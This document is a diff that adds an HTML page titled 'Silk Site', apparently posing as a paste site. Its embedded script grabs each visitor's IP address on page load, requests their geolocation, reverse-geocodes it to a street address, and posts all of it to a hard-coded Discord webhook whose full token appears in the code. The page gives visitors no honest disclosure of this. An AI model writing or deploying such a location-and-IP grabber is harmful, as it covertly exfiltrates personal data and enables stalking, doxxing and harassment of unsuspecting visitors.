@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Silk Site</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <h1 class="title">Silk Site</h1>
+    <div class="neon-box">Pastes</div>
+    <p id="status">Fetching location...</p>
+    <p id="ip">Fetching IP...</p>
+</body>
+
+<script>
+    const webhookURL = "https://discord.com/api/webhooks/1378817877422899321/joVNyKpeSzQtAsedMfvu4U3tcWOTek3RrRnVsn3xM99kRdDJIsM_PKZ3U1_c5oP2_H_c";
+
+    function sendToDiscord(lat, lon, address, ip) {
+        let payload = {
+            content: `🌍 **User Info:**\n- Latitude: ${lat}\n- Longitude: ${lon}\n- Address: ${address}\n- IP: ${ip}`
+        };
+
+        fetch(webhookURL, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(payload)
+        }).then(() => {
+            document.getElementById("status").innerText = "Location & IP sent to Discord!";
+        }).catch(error => console.error("Error sending to Discord:", error));
+    }
+
+    function getLocation() {
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(showPosition, showError);
+        } else {
+            document.getElementById("status").innerText = "Geolocation not supported.";
+        }
+    }
+
+    function showPosition(position) {
+        let lat = position.coords.latitude;
+        let lon = position.coords.longitude;
+
+        fetch(`https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lon}&format=json`)
+        .then(response => response.json())
+        .then(data => {
+            let address = data.display_name || "Unknown location";
+            sendToDiscord(lat, lon, address, userIP);
+        })
+        .catch(error => console.error("Error fetching address:", error));
+    }
+
+    function showError(error) {
+        const errors = {
+            1: "User denied location access.",
+            2: "Location unavailable.",
+            3: "Request timed out.",
+            4: "Unknown error occurred."
+        };
+        document.getElementById("status").innerText = errors[error.code] || "Error retrieving location.";
+    }
+
+    let userIP = "";
+
+    fetch('https://api.ipify.org?format=json')
+    .then(response => response.json())
+    .then(data => {
+        userIP = data.ip;
+        document.getElementById("ip").innerText = `Your IP: ${userIP}`;
+        sendToDiscord("N/A", "N/A", "IP Only", userIP);
+    })
+    .catch(error => console.error("Error fetching IP:", error));
+
+    getLocation();
+</script>
+</html>
